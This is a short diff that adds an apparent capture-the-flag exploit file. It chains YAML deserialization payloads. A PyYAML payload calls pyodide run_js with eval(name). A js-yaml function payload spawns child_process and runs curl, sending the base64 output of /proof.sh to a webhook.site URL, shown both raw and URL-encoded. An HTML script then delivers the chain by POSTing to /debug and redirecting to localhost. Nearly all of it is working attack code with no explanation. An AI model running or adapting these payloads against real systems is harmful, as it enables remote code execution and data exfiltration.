@@ -1,0 +1,15 @@
+PyYAML:
+!!python/object/apply:pyodide.code.run_js
+- eval(name)
+
+JSYAML:
+{toString: !!js/function '_=>"".sub.constructor("process.mainModule.constructor._load(\"child_process\").execSync(\"curl https://webhook.site/9dab91fb-e602-4042-be58-8b47133564aa/?$(/proof.sh |base64)\")")()'}
+
+Encoded JSYAML:
+%7BtoString%3A%20!!js%2Ffunction%20'_%3D%3E%22%22.sub.constructor(%22process.mainModule.constructor._load(%5C%22child_process%5C%22).execSync(%5C%22curl%20https%3A%2F%2Fwebhook.site%2F9dab91fb-e602-4042-be58-8b47133564aa%2F%3F%24(%2Fproof.sh%20%7Cbase64)%5C%22)%22)()'%7D
+
+JS:
+<script>
+name=`document.cookie="debug=on";fetch("/debug",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"yaml=%7BtoString%3A%20!!js%2Ffunction%20'_%3D%3E%22%22.sub.constructor(%22process.mainModule.constructor._load(%5C%22child_process%5C%22).execSync(%5C%22curl%20https%3A%2F%2Fwebhook.site%2F9dab91fb-e602-4042-be58-8b47133564aa%2F%3F%24(%2Fproof.sh%20%7Cbase64)%5C%22)%22)()'%7D"})`;
+location="http://localhost:3000/#!!python/object/apply:pyodide.code.run_js%0a-%20eval(name)";
+</script>
